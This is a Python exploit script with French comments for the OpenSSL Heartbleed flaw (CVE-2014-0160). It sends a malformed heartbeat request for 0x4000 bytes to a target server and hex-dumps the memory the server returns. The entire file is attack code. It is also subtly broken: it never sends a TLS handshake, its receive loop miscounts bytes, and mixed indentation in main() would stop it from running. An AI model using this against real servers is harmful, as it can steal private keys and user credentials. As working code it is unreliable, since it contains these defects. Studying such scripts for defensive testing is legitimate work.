
 
import sys
import struct
import socket
import time
import select
import re
import codecs
from optparse import OptionParser
 #appel de fonction getdecoder
decode_hex = codecs.getdecoder('hex_codec')
 
options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
 #mise sous forme binaire et encodage
def h2bin(x):
        return decode_hex(x.replace(' ', '').replace('\n', ''))[0]
 
hb = h2bin(''' 
        18 03 02 00 03
        01 40 00
        ''')
 #extraction du retour message de pay
def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print( '  %04x: %-48s %s' % (b, hxdat, pdat))
    print()
	
 #attente de réponse de data
def wait(s, length, timeout=5):
    waitingtime = time.time() + timeout
    value = b''
    tmpvalue = length
    while tmpvalue > 0:
        tmptime = waitingtime - time.time() 
        if tmptime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            value = s.recv(tmpvalue)
            if not value:
              return None
            value += value
            tmpvalue -= len(value)
    return value
        
 #enleve la structure du message en 3 value si non nulle
def valuesofdata(s):
	
    datapure = wait(s, 5)
    if datapure is None:
        print( 'pas de connexon')
        return None, None, None
	#récupération des information de l'objet mis sous la forme d'une structure
    typ, ver, ln = struct.unpack('>BHH', datapure)
    pay = wait(s, ln, 10)
    return typ, ver, pay
 #verifie qu'il est possible que le message contienne bien plus de data
def testdata(s):
    s.send(hb)
    while True:
        typ, ver, pay = valuesofdata(s)
        if typ is None:
            return False
 
        if typ == 24:
            hexdump(pay)
            if len(pay) > 3:
                print( 'vulnerable')
            else:
                print( 'pas vulnerable')
            return True
 
        if typ == 21:
            return False
 
def main():
	#value args
    opts, args = options.parse_args()
	#socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sys.stdout.flush()
    s.connect((args[0], opts.port))
	
    if opts.starttls:
		#recupération des data des sockets avec 4096 octet 
        re = s.recv(4096)
        if opts.debug: print( re)
        s.send(b'ehlo starttlstest\n')
		#recupération des data des sockets avec 1024 octet
        re = s.recv(1024)
        if opts.debug: print( re)
		#test de connexion
        if not b'STARTTLS' in re:
            if opts.debug: print( re)
            sys.exit(0)
        s.send(b'starttls\n')
        re = s.recv(1024)
    
    sys.stdout.flush()
	sys.stdout.flush()
    s.send(hb)
    testdata(s)
 
if __name__ == '__main__':
        main()